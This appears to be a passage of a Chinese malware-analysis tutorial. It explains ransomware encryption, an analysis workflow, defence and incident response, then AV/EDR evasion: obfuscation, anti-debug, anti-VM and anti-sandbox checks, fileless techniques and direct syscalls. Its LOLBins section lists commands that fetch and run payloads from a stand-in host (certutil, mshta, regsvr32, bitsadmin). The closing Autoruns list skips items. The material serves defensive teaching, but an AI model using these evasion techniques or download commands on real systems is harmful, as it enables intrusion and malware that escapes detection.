2. 使用 AES 密钥加密用户文件
3. 使用攻击者的 RSA 公钥加密 AES 密钥
4. 将加密后的 AES 密钥保存在加密文件中
5. 只有攻击者拥有 RSA 私钥，才能解密 AES 密钥

为什么使用混合加密：
- 对称加密（AES）速度快，适合加密大量文件
- 非对称加密（RSA）适合加密密钥（密钥长度小）
- 只有攻击者有私钥，受害者无法自己解密
```

**常见加密算法**

| 算法 | 类型 | 常见用途 |
|------|------|----------|
| AES-128/256 | 对称加密 | 加密文件内容（最常用） |
| RSA-1024/2048/4096 | 非对称加密 | 加密 AES 密钥 |
| RC4 | 流加密 | 一些旧勒索软件使用 |
| ChaCha20 | 流加密 | 一些新勒索软件使用 |
| Salsa20 | 流加密 | 部分勒索软件使用 |

**加密算法识别方法**

```
1. 字符串分析
   - 搜索 "AES"、"RSA"、"encrypt"、"decrypt" 等关键词
   - 查找加密常量（如 AES S-box、RSA 公钥模数）

2. 导入函数分析
   - CryptEncrypt、CryptDecrypt（CryptoAPI）
   - BCryptEncrypt、BCryptDecrypt（CNG）
   - 自定义加密（无加密库导入）

3. 动态分析
   - 监控加密 API 调用
   - 分析内存中的加密密钥
   - 对比加密前后的文件内容

4. 静态分析
   - 反汇编分析加密函数
   - 识别加密算法特征常量
   - 使用加密算法识别工具（如 FindCrypt、KANAL）
```

### 4.3 勒索软件分析流程

**第一步：样本获取和初步分析**

```
1. 获取样本文件
2. 计算文件哈希（MD5、SHA-1、SHA-256）
3. 文件类型识别（查壳、识别编程语言）
4. 查询在线沙箱报告（VirusTotal、Hybrid Analysis）
5. 字符串分析（勒索信内容、C2 地址、加密相关）
6. 导入表分析（加密 API、系统 API）
```

**第二步：静态详细分析**

```
1. 脱壳（如果有壳）
2. 反汇编和反编译分析
3. 识别加密算法
4. 分析文件加密流程
5. 分析密钥生成和管理
6. 查找硬编码的密钥或弱点
7. 分析持久化机制
8. 分析横向移动模块
```

**第三步：动态分析**

```
1. 准备分析环境（虚拟机、快照、网络模拟）
2. 运行勒索软件
3. 监控进程行为
4. 监控文件系统变化
5. 监控注册表变化
6. 捕获网络流量
7. 观察加密过程和勒索信
8. 提取内存中的密钥（可能）
```

**第四步：IOC 提取和报告编写**

```
提取 IOC（Indicators of Compromise）：
1. 文件哈希（MD5、SHA-1、SHA-256）
2. IP 地址和域名
3. URL 和路径
4. 互斥体名称
5. 注册表键值
6. 文件名和路径
7. 加密文件后缀
8. 勒索信文件名
9. 服务名和计划任务名
10. C2 通信特征

编写分析报告：
1. 样本基本信息
2. 技术分析（感染流程、加密方式、持久化等）
3. IOC 列表
4. 防护建议
5. 附录（截图、代码片段等）
```

### 4.4 勒索软件防御要点

**预防措施**

```
1. 数据备份（3-2-1 原则）
   - 至少 3 份数据副本
   - 存储在 2 种不同介质上
   - 1 份异地存储（离线或云）
   - 定期测试备份的可用性

2. 补丁管理
   - 及时安装系统和应用补丁
   - 重点关注 RCE 漏洞补丁
   - 定期漏洞扫描

3. 端点防护
   - 部署杀毒软件和 EDR
   - 启用实时保护
   - 启用行为监控
   - 定期更新病毒库

4. 邮件安全
   - 部署邮件网关
   - 过滤可疑附件和链接
   - 启用沙箱检测
   - 员工钓鱼意识培训

5. 网络分段
   - 按业务和安全级别分段
   - 限制横向移动路径
   - 部署网络访问控制（NAC）
   - 监控内部网络流量

6. 最小权限原则
   - 用户使用普通权限账户
   - 限制本地管理员权限
   - 实施特权访问管理（PAM）
   - 定期审计权限分配

7. 应用白名单
   - 只允许授权程序运行
   - 使用 AppLocker 或软件限制策略
   - 限制脚本执行权限
   - 禁用 Office 宏（默认禁用）
```

**检测措施**

```
1. 文件系统监控
   - 监控大量文件修改事件
   - 监控特定文件类型的修改
   - 监控勒索信文件的创建
   - 监控文件重命名操作

2. 网络监控
   - 监控可疑的出站连接
   - 监控大量数据上传（数据窃取）
   - 监控访问已知恶意 IP/域名
   - 监控 Tor 网络访问

3. 行为监控
   - 监控异常的进程行为
   - 监控卷影副本删除
   - 监控安全软件被禁用
   - 监控大量文件加密操作

4. 威胁狩猎
   - 主动搜索入侵迹象
   - 分析日志异常
   - 威胁情报匹配
   - 红队演练
```

**应急响应**

```
勒索软件攻击应急响应流程：

1. 遏制（Containment）
   - 立即隔离受感染主机（断开网络）
   - 防止进一步传播
   - 保护未感染的系统

2. 评估（Assessment）
   - 确定感染范围
   - 确定勒索软件家族
   - 评估数据损失
   - 评估业务影响

3. 调查（Investigation）
   - 确定入侵路径
   - 分析攻击时间线
   - 提取 IOC
   - 评估是否有数据泄露

4. 恢复（Recovery）
   - 从备份恢复数据
   - 修复被利用的漏洞
   - 清理持久化机制
   - 逐步恢复业务

5. 改进（Improvement）
   - 分析事件原因
   - 加强安全防护
   - 更新安全策略
   - 员工安全培训

是否支付赎金？
- 一般建议：不支付赎金
- 原因：
  1. 不保证能恢复所有数据
  2. 资助犯罪行为
  3. 可能成为后续攻击目标
  4. 可能违反法律法规
- 例外情况（需要管理层决策）：
  1. 没有可用备份
  2. 数据极其重要且无法替代
  3. 业务中断损失远大于赎金
```

## 五、常见免杀技术

### 5.1 免杀概述

**什么是免杀**

免杀（Anti-Virus Detection Bypass / AV/EDR Evasion）是指通过各种技术手段使恶意代码不被杀毒软件、EDR 等安全产品检测到。免杀是恶意代码分析的重要内容，理解免杀技术才能更好地检测和防御恶意软件。

**免杀技术分类**

```
1. 静态免杀
   - 特征码免杀
   - 加壳/加密
   - 代码混淆
   - 文件格式变换

2. 动态免杀
   - 反调试
   - 反虚拟机
   - 反沙箱
   - 行为隐藏

3. 高级免杀
   - 无文件攻击
   - 白名单利用（LOLBins）
   - 直接系统调用
   - EDR 钩子绕过
```

### 5.2 静态免杀技术

**特征码修改**

```
特征码是杀毒软件用来识别恶意代码的特定字节序列。
修改特征码可以绕过基于特征码的检测。

方法：
1. 代码等价替换
   - 用不同的指令实现相同功能
   - mov eax, 0  →  xor eax, eax
   - add eax, 1  →  inc eax

2. 指令重排
   - 改变不相关指令的顺序
   - 插入无意义的指令（NOP、不影响结果的指令）

3. 字符串加密
   - 加密所有明文字符串
   - 运行时动态解密

4. 导入表混淆
   - 动态获取 API 地址（GetProcAddress + 哈希）
   - 不使用标准导入表
```

**加壳和加密**

```
加壳是最常见的免杀方法之一，通过加密/压缩原始代码，
使杀毒软件无法直接扫描到特征码。

常见加壳方式：
1. 商业加壳器
   - VMProtect、Themida、ASProtect
   - 强度高，但特征也明显

2. 自定义加壳
   - 自己编写壳代码
   - 加密算法自定义
   - 特征不明显，更难检测

3. 多重重加壳
   - 用多种加壳器多重加壳
   - 增加分析难度
   - 但也可能更容易被启发式检测
```

**代码混淆**

```
代码混淆通过各种技术使代码难以理解和分析，
同时保持功能不变。

常见混淆技术：
1. 控制流平坦化（Control Flow Flattening）
   - 将正常的控制流转换为 switch-case 结构
   - 增加静态分析难度

2. 不透明谓词（Opaque Predicates）
   - 插入结果固定但看似不确定的条件判断
   - 增加无用的分支路径

3. 指令替换
   - 用复杂指令序列替换简单指令
   - 例如：用加法和移位替换乘法

4. 字符串加密
   - 所有字符串都加密存储
   - 运行时动态解密

5. 花指令（Junk Code）
   - 插入大量无用的代码
   - 干扰静态分析和特征匹配

6. 虚拟化
   - 将代码转换为自定义虚拟机指令
   - 强度最高，分析难度最大
```

### 5.3 反调试技术

**什么是反调试**

反调试是指恶意代码检测自身是否被调试器附加，如果检测到调试器则改变行为（如不执行恶意功能、自毁、延迟执行等）。

**常见反调试技术**

**方法1：IsDebuggerPresent API**

```c
// Windows API 直接检测
BOOL IsDebuggerPresent();

// 实现原理：检查 PEB 的 BeingDebugged 字段
// PEB (Process Environment Block) 结构中包含 BeingDebugged 字节
```

**方法2：CheckRemoteDebuggerPresent**

```c
// 检查指定进程是否被调试
BOOL CheckRemoteDebuggerPresent(
  HANDLE hProcess,
  PBOOL  pbDebuggerPresent
);
```

**方法3：NtQueryInformationProcess**

```c
// 查询进程信息，检测调试端口
NtQueryInformationProcess(
  ProcessHandle,
  ProcessDebugPort,  // 0x7
  &debugPort,
  sizeof(debugPort),
  NULL
);
// 如果返回非零值，表示有调试器
```

**方法4：PEB 检测**

```
PEB（Process Environment Block）包含多个调试相关字段：
- BeingDebugged：是否被调试（+2 偏移）
- NtGlobalFlag：全局标志（+0x68 偏移）
  - 调试器附加时，FLG_HEAP_ENABLE_TAIL_CHECK、FLG_HEAP_ENABLE_FREE_CHECK、FLG_HEAP_VALIDATE_PARAMETERS 被设置

检测方法：
1. 直接读取 PEB->BeingDebugged
2. 检查 PEB->NtGlobalFlag 的标志位
3. 检查堆头的 Flags 和 ForceFlags 字段
```

**方法5：时间检测**

```
原理：调试器中单步执行会导致程序运行变慢。

方法：
1. 使用 GetTickCount / GetTickCount64
   - 记录代码执行前后的时间差
   - 如果时间差过大，说明可能在被调试

2. 使用 QueryPerformanceCounter
   - 高精度计时器
   - 检测短时间间隔的延迟

3. 使用 RDTSC 指令
   - 读取 CPU 时间戳计数器
   - 最精确的时间检测方法

绕过方法：
- 在时间检测函数上下断点
- 修改返回值
- 使用虚拟机加速
```

**方法6：异常检测**

```
原理：调试器通常会捕获异常。恶意代码故意触发异常，
如果异常被自己处理，说明没有调试器；如果被调试器拦截，说明有调试器。

常见方法：
1. INT3 断点异常
2. 除零异常
3. 内存访问异常
```

**方法7：硬件断点检测**

```
原理：调试器常使用硬件断点（DR0-DR7 调试寄存器）。

方法：
1. 调用 GetThreadContext 检查调试寄存器
2. 直接读取 DRx 寄存器（需要 ring0 或 VEH）
```

### 5.4 反虚拟机技术

**常见反虚拟机技术**

**方法1：检测虚拟机特定字符串**

```
检测特征字符串：
- "VMware"、"VirtualBox"、"VBox"、"KVM"、"QEMU"
- 虚拟机设备名称、驱动名称、服务名称
- 虚拟机 MAC 地址前缀（00:0C:29、00:50:56 等）

检测位置：
- 注册表（HKLM\SYSTEM\CurrentControlSet\Services\）
- 进程列表（vmtoolsd.exe、VBoxService.exe 等）
- 文件系统（C:\Program Files\VMware\ 等）
- WMI 查询（Win32_BIOS、Win32_ComputerSystem）
```

**方法2：检测虚拟机特定指令**

```
VMware 后门指令：
- 使用 IN 指令从端口 0x5658 ('VX') 读取数据
- 这是 VMware 的后门接口，用于虚拟机和宿主机通信
- 如果返回有效结果，说明运行在 VMware 中

示例代码：
mov eax, 'VMXh'
mov ebx, 0
mov ecx, 10  ; 获取 VMware 版本
mov edx, 'VX' ; 端口 0x5658
in eax, dx
cmp ebx, 'VMXh'
je _is_vmware
```

**方法3：检测硬件资源**

```
虚拟机的硬件资源通常较小或有特征：
- CPU 核心数少（1-2 核）
- 内存小（< 4GB）
- 磁盘小（< 50GB）
- 屏幕分辨率小（800x600）
- 没有鼠标移动/键盘输入
- CPU 型号包含 "Virtual"、"VMware" 等
```

**方法4：检测特定驱动和服务**

```
虚拟机工具的驱动和服务：
VMware:
- 服务：VMTools、VMware Physical Disk Helper Service
- 驱动：vmx86.sys、vm3dmp.sys

VirtualBox:
- 服务：VBoxService
- 驱动：VBoxDrv.sys、VBoxMouse.sys

检测方法：
- 枚举服务（OpenSCManager + EnumServicesStatus）
- 枚举驱动（EnumDeviceDrivers）
- 检查文件是否存在
```

### 5.5 反沙箱技术

**常见反沙箱技术**

**方法1：延迟执行**

```
原理：沙箱通常有超时限制（如 2-5 分钟），
恶意代码可以先等待一段时间再执行恶意功能。

方法：
- Sleep() 长时间睡眠
- 循环等待（用其他计算消耗时间）
- 设置定时器
- 等待特定时间或日期

绕过方法：
- 跳过 Sleep 调用
- 加速时间
- 补丁时间相关函数
```

**方法2：检测用户交互**

```
原理：沙箱通常没有真实用户操作，
恶意代码可以检测是否有用户交互来判断是否是沙箱。

检测方法：
1. 鼠标移动
   - GetCursorPos：检查鼠标位置是否变化
   - GetLastInputInfo：获取最后输入时间

2. 键盘输入
   - GetAsyncKeyState：检查按键状态
   - 捕获键盘消息

3. 点击次数
   - 统计鼠标点击次数

4. 对话框
   - 弹出 MessageBox，需要用户点击才继续
```

**方法3：检测沙箱特定文件/注册表/进程**

```
常见沙箱特征：
- Cuckoo：C:\cuckoo、cuckoomon.dll、pip 服务
- Sandboxie：SbieDrv.sys、SbieSvc.exe
- Joe Sandbox：特定驱动和进程
- 分析工具：Procmon.exe、Wireshark.exe、x32dbg.exe 等

检测方法：
- 检查特定文件是否存在
- 检查特定进程是否运行
- 检查特定注册表键值
- 检查窗口标题
```

**方法4：检测 CPUID 和指令集**

```
有些沙箱使用 CPU 模拟或二进制翻译，
某些 CPU 指令的行为可能与真实 CPU 不同。

检测方法：
1. 执行 CPUID 指令，检查返回值
2. 检查特定指令的执行时间
3. 利用某些指令的副作用进行检测
```

### 5.6 高级免杀技术

**无文件攻击（Fileless Malware）**

```
无文件攻击是指恶意代码不写入磁盘，完全存在于内存中。
这种攻击方式难以被传统杀毒软件检测到。

常见技术：
1. PowerShell 无文件攻击
   - 直接从内存执行 PowerShell 代码
   - 编码和混淆脚本（Base64、XOR 等）
   - 利用 .NET 框架在内存中加载程序集

2. 反射式 DLL 注入
   - DLL 完全从内存加载，不经过磁盘
   - 自己处理加载、重定位、导入解析

3. 进程空洞（Process Hollowing）
   - 创建挂起的合法进程
   - 取消映射其内存
   - 写入恶意代码
   - 恢复执行

4. 注册表驻留
   - 将恶意代码存储在注册表中
   - 需要时从注册表读取并执行

5. WMI 事件订阅
   - 将恶意脚本存储在 WMI 仓库中
   - 通过 WMI 事件触发执行
```

**白名单利用（LOLBins）**

```
LOLBins（Living Off The Land Binaries）是指利用系统自带的
合法工具来执行恶意操作。这些工具通常在白名单中，
不会被安全软件拦截。

常见 Windows LOLBins：

1. PowerShell
   - 执行命令、下载文件、反射注入
   - powershell -enc <base64编码的脚本>

2. certutil
   - 下载文件、编码/解码
   - certutil -urlcache -split -f http://x.com/file.exe file.exe
   - certutil -decode file.b64 file.exe

3. mshta
   - 执行 HTA 文件（HTML Application）
   - mshta http://x.com/payload.hta

4. regsvr32
   - 注册 COM 组件，执行 DLL
   - regsvr32 /s /n /u /i:http://x.com/scrobj.sct scrobj.dll
   - 又称 "Squiblydoo" 攻击

5. rundll32
   - 运行 DLL 中的函数
   - rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";...

6. msiexec
   - 安装 MSI 包
   - msiexec /q /i http://x.com/payload.msi

7. wmic
   - WMI 命令行工具
   - wmic process call create "cmd.exe /c whoami"

8. bitsadmin
   - 后台智能传输服务
   - bitsadmin /transfer job /download http://x.com/file.exe C:\file.exe

9. cscript / wscript
   - Windows 脚本宿主
   - cscript //b //nologo script.vbs

10. odbcconf
    - ODBC 配置工具
    - odbcconf /a {REGSVR32 payload.dll}
```

**直接系统调用（Direct Syscalls）**

```
原理：EDR 通常通过在用户态 API 上设置钩子来监控系统调用。
如果直接通过 syscall/sysenter 指令调用内核，
就可以绕过用户态钩子。

实现方法：
1. 直接使用汇编执行 syscall
   - 从 ntdll.dll 中获取 syscall 编号
   - 直接用汇编调用

2. 间接系统调用
   - 跳转到 ntdll.dll 中 syscall 指令的地址
   - 避免自己的代码中出现 syscall 指令

3. 从磁盘读取 ntdll
   - 从磁盘读取干净的 ntdll.dll
   - 覆盖内存中被 hook 的 ntdll
   - 使用干净的函数

局限性：
- 只能绕过用户态钩子
- 无法绕过内核态回调和监控
- EDR 可以通过其他方式检测（如 ETW、内核回调）
```

```
Autoruns 是最全面的启动项检查工具。

可检查的启动位置：

3. 计划任务
4. 服务
5. 驱动
6. Winlogon 通知
7. AppInit_DLLs

9. 已知 DLL
10. WinSock 提供商
11. 打印监视器
12. LSA 安全提供程序
13. 网络提供程序
14. WMI 事件订阅

16. Office 插件
17. 编解码器
18. Sidebar 小工具

使用技巧：
- 勾选 "Hide Microsoft Entries" 隐藏微软签名的项

- 绿色 = 最近新增的项
```
